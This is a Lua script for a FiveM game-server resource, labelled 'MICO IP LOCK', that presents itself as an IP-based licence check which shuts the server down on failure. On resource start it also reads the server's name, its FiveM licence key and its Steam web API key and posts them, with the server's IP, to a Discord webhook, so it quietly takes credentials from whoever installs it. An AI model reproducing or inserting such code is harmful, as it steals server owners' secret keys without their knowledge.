PerformHttpRequest("https://api.ipify.org/", function (text)
	if text ~= "IP" then
		Wait(10000)
    print("> Checking IP ...")
		print("> Your IP has not been successfully validated!")
		print("> Closing Server")
		Wait(12000)
		os.exit(-1)
	else
    print("> Checking IP ...")
		print("> Your IP has been successfully validated!")
    print("> Enjoy your server!")
	end
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
      PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
        local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
        local content = {{
        author = {
          name = 'MICO IP LOCK',
          icon_url = 'https://cdn.discordapp.com/avatars/391706038698508299/a24fee7d14ed8f4418c844239d5543d5.webp'
        },
        ["color"] = 0000,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "MICO | IPLOCK",
        },}}
        PerformHttpRequest("WEBHOOK", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
    end
end)
